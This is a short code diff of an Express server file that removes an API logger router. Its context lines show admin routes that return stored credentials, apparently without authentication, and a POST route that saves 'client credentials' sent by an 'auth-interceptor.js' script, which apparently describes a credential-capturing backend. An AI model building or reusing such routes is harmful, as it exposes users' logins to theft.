@@ -8,7 +8,6 @@ import { appRouter } from "../routers";
 import { createContext } from "./context";
 import { getCredentials, getCredentialByEmail } from "../adminEndpoint";
 import { serveStatic, setupVite } from "./vite";
-import apiLoggerRouter from "./api-logger";
 
 function isPortAvailable(port: number): Promise<boolean> {
   return new Promise(resolve => {
@@ -41,9 +40,6 @@ async function startServer() {
   // Admin REST endpoints (simple JSON API)
   app.get("/api/admin/credentials", getCredentials);
   app.get("/api/admin/credentials/:email", getCredentialByEmail);
-  
-  // API Logger routes
-  app.use("/api", apiLoggerRouter);
   
   // POST endpoint to save client credentials (called by auth-interceptor.js)
   app.post("/api/admin/save-credentials", async (req, res) => {
